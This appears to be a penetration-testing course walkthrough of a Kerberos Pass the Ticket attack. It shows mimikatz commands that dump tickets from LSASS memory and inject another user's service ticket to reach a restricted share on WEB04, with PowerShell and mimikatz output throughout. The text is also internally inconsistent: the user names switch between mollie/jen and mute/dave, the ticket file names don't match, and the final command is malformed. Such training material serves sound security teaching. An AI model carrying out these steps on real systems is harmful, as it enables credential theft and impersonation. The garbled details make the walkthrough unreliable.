Pass the Ticket
We used the overpass the hash technique (along with the captured NTLM hash) to acquire a Kerberos TGT, allowing us to authenticate using Kerberos. 
We can only use the TGT on the machine it was created for, but the TGS potentially offers more flexibility.

The Pass the Ticket attack takes advantage of the TGS, which may be exported and re-injected elsewhere on the network and then used to authenticate to a specific service. 
In addition, if the service tickets belong to the current user, then no administrative privileges are required.

In this scenario, we are going to abuse an already existing session of mute. 
The mute user has privileged access to the backup folder located on WEB04 where our logged in user mollie does not.

To demonstrate the attack angle, we are going to extract all the current TGT/TGS in memory and inject mute's WEB04 TGS into our own session. 
Inject mutes web04 TGS into our session
This will allow us to access the restricted folder.

Let's first log in as mollie to CLIENT76 and verify that we are unable to access the resource on WEB04. 
To do so, we'll try to list the content of the \\web04\backup folder from an administrative PowerShell command line session.

PS C:\Windows\system32> whoami
corp\mollie
PS C:\Windows\system32> ls \\web04\backup
ls : Access to the path '\\web04\backup' is denied.
At line:1 char:1
+ ls \\web04\backup
+ ~~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (\\web04\backup:String) [Get-ChildItem], UnauthorizedAccessException
    + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand

   - Verifying that the user jen has no access to the shared folder

Confirming that jen has no access to the restricted folder, we can now launch mimikatz, enable debug privileges, and export all the TGT/TGS from memory with the sekurlsa::tickets /export command.

mimikatz #privilege::debug
Privilege '20' OK

mimikatz #sekurlsa::tickets /export

The above command parsed the LSASS process space in memory for any TGT/TGS, which is then saved to disk in the kirbi mimikatz format.
Because inspecting the generated tickets indicates that dave had initiated a session, we can try to inject one of their tickets inside jen's sessions.
We can verify newly generated tickets with dir, filtering out on the kirbi extension.

PS C:\Tools> dir *.kirbi

    Directory: C:\Tools
Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        9/14/2022   6:24 AM           1561 [0;12bd0]-0-0-40810000-mute@cifs-web04.kirbi
-a----        9/14/2022   6:24 AM           1505 [0;12bd0]-2-0-40c10000-mute@krbtgt-CORP.COM.kirbi
-a----        9/14/2022   6:24 AM           1561 [0;1c6860]-0-0-40810000-mute@cifs-web04.kirbi
-a----        9/14/2022   6:24 AM           1505 [0;1c6860]-2-0-40c10000-mute@krbtgt-CORP.COM.kirbi
-a----        9/14/2022   6:24 AM           1561 [0;1c7bcc]-0-0-40810000-mute@cifs-web04.kirbi
-a----        9/14/2022   6:24 AM           1505 [0;1c7bcc]-2-0-40c10000-mute@krbtgt-CORP.COM.kirbi
-a----        9/14/2022   6:24 AM           1561 [0;1c933d]-0-0-40810000-mute@cifs-web04.kirbi
-a----        9/14/2022   6:24 AM           1505 [0;1c933d]-2-0-40c10000-mute@krbtgt-CORP.COM.kirbi
-a----        9/14/2022   6:24 AM           1561 [0;1ca6c2]-0-0-40810000-mute@cifs-web04.kirbi
-a----        9/14/2022   6:24 AM           1505 [0;1ca6c2]-2-0-40c10000-mute@krbtgt-CORP.COM.kirbi
    Exporting Kerberos TGT/TGS to disk

As many tickets have been generated, we can just pick any TGS ticket in the mute@cifs-web04.kirbi format and inject it through mimikatz via the kerberos::ptt command.

Injecting the selected TGS into process memory:
mimikatz # kerberos::ptt [0;12bd0]-0-0-40810000-mute@cifs-web04.kirbi

* File: '[0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi': OK
    
No errors have been thrown, meaning that we should expect the ticket in our session when running klist.

PS C:\Tools> klist
Current LogonId is 0:0x13bca7
Cached Tickets: (1)
#0>     Client: mute @ CORP.COM
        Server: cifs/web04 @ CORP.COM
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40810000 -> forwardable renewable name_canonicalize
        Start Time: 9/14/2022 5:31:32 (local)
        End Time:   9/14/2022 15:31:13 (local)
        Renew Time: 9/21/2022 5:31:13 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0
        Kdc Called:
  Inspecting the injected ticket in memory

We notice that the mute ticket has been successfully imported in our own session for the mollie user.
Let's confirm we have been granted access to the restricted shared folder.

cat ls \\web04\backup\Rio.txt
We managed to successfully access the folder by impersonating dave's identity after injecting its authentication token into our user's process.

